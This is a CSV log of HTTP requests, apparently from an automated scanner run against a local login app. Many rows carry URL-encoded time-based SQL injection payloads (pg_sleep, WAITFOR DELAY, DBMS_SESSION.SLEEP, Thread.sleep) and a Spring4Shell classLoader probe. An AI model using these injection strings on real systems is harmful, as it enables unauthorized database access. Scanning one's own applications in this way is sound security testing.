ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
1330,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1331,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1332,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1333,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000,302,Found,15,114,0
1334,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,13,260,0
1335,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1336,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1337,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1338,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,6,133,3357
1339,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,3,260,0
1340,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,14,133,3358
1341,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1343,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,15,133,3363
1342,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1344,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1345,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,10,133,3358
1346,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1347,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1348,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%22java.lang.Thread.sleep%22%2815000%29,200,OK,6,133,3238
1349,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1350,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+%2F+%22java.lang.Thread.sleep%22%2815000%29+,200,OK,10,133,3289
1351,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,200,OK,8,133,3293
1352,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1353,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1354,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,200,OK,18,133,3303
1355,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1356,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,12,133,3417
1357,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,16,260,0
1358,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,11,133,3418
1359,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,17,260,0
1360,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1361,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1362,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1363,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1364,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000,302,Found,7,114,0
1365,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1366,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1368,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1367,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%28DBMS_SESSION.SLEEP%2815%29%29,200,OK,6,133,3221
1369,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1370,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1371,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+,200,OK,7,133,3272
1372,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1373,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+%2F+%27,200,OK,3,133,3276
1374,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1375,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+%2F+%22,200,OK,16,133,3286
1376,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,19,260,0
1377,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+and+exists+%28DBMS_SESSION.SLEEP%2815%29%29+--+,200,OK,16,133,3284
1378,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,26,260,0
1379,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1380,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1381,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000,302,Found,15,114,0
1382,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,18,260,0
1383,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1384,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,200,OK,13,133,3264
1385,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1386,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,10,133,3268
1387,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1388,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,4,133,3269
1389,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1390,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,4,133,3274
1391,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1392,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+,200,OK,8,133,3315
1393,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1394,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1395,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1396,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000,302,Found,11,114,0
1397,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000,302,Found,3,114,0
1398,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,3,260,0
1399,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1400,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1401,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,4,133,3271
1402,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1403,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,4,133,3272
1404,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1405,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,4,133,3277
1406,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1407,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,11,133,3272
1408,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1409,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,7,133,3274
1410,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1411,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1412,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,14,133,3279
1413,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1414,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,4,133,3273
1415,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1417,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1416,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,3,133,3275
1418,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1419,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,9,133,3280
1420,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1421,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1422,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,200,OK,11,133,3270
1423,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1424,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1425,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1426,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1427,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1428,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000,302,Found,2,114,0
1429,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,5,133,3170
1430,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,6,133,3244
1431,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,4,133,3170
1433,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000?class.module.classLoader.DefaultAssertionStatus=nonsense,404,Not Found,14,140,2571
1434,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/,405,Method Not Allowed,5,149,2579
1432,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,11,133,3170
1435,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/sitemap.xml?class.module.classLoader.DefaultAssertionStatus=nonsense,404,Not Found,5,140,2571
1436,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/sitemap.xml,405,Method Not Allowed,11,149,2579
1437,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000,405,Method Not Allowed,13,149,2579
1438,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C&class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,30,133,3244
1439,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000/robots.txt?class.module.classLoader.DefaultAssertionStatus=nonsense,404,Not Found,9,140,2571
1440,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/robots.txt,405,Method Not Allowed,4,149,2579
1441,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,13,133,3244
1442,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C,200,OK,7,133,3244
1443,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,GET,http://0.0.0.0:5000,302,Found,10,114,0
1444,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/,405,Method Not Allowed,19,149,2579
1445,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1446,Fri Apr 17 17:38:15 EDT 2026,Fri Apr 17 17:38:15 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
